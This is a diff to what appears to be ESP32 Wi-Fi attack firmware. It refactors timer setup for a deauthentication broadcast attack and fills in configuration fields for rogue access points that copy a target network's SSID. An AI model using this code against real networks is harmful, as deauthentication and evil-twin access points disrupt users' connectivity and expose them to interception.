@@ -69,7 +69,9 @@ static void timer_send_deauth_frame(void* arg) {
  * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
  */
 void attack_method_broadcast(ap_records_t* ap_records, unsigned period_sec) {
-  const esp_timer_create_args_t deauth_timer_args = {.callback = &timer_send_deauth_frame, .arg = (void*)ap_records};
+  esp_timer_create_args_t deauth_timer_args{};
+  deauth_timer_args.callback = &timer_send_deauth_frame;
+  deauth_timer_args.arg = (void*)ap_records;
 
   // Call for the first time
   timer_send_deauth_frame(ap_records);
@@ -97,7 +99,10 @@ void start_rogue_ap(const wifi_ap_record_t* ap_record) {
                                  ap_record->authmode,                      // authmode
                                  0,                                        // ssid_hidden
                                  1,                                        // max_connection
-                                 0                                         // beacon_interval
+                                 0,                                        // beacon_interval
+                                 WIFI_CIPHER_TYPE_NONE,                    // pairwise_cipher
+                                 false,                                    // ftm_responder
+                                 {false, false}                            // pmf_cfg
                              }};
 
   mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
@@ -133,8 +138,9 @@ void start_multiple_rogue_ap_attack(ap_records_t* ap_records, uint16_t per_ap_ti
   gMmultipleRogueApData->current_ap_idx = 0;
   gMmultipleRogueApData->ap_records = ap_records;
 
-  const esp_timer_create_args_t rogueap_timer_args = {.callback = &timer_change_rogue_ap,
-                                                      .arg = (void*)gMmultipleRogueApData};
+  esp_timer_create_args_t rogueap_timer_args{};
+  rogueap_timer_args.callback = &timer_change_rogue_ap;
+  rogueap_timer_args.arg = (void*)gMmultipleRogueApData;
   ESP_ERROR_CHECK(esp_timer_create(&rogueap_timer_args, &rogueap_timer_handle));
 
   // Call for the first time
